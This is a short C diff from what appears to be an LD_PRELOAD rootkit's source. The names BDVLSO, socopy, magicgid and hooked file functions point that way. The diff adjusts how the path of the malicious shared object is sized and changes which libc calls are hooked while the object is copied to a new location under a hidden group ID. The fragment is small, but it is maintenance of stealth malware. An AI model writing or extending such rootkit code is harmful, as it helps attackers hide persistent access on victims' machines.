@@ -31,7 +31,7 @@ char *sogetpath(char *sopath){
     platform = sogetplatform(sopath);
     if(platform == NULL) return NULL;
 
-    pathsize = strlen(INSTALL_DIR) +
+    pathsize = LEN_INSTALL_DIR +
                strlen(BDVLSO) +
                strlen(platform) + 4;
 
@@ -51,7 +51,7 @@ int socopy(const char *opath, char *npath, gid_t magicgid){
     mode_t somode;
     off_t fsize, blksize;
 
-    hook(CFOPEN, CFWRITE, CCHMOD);
+    hook(CFWRITE, CCHMOD);
 
     ofp = bindup(opath, npath, &nfp, &fsize, &somode);
     if(ofp == NULL) return -1;
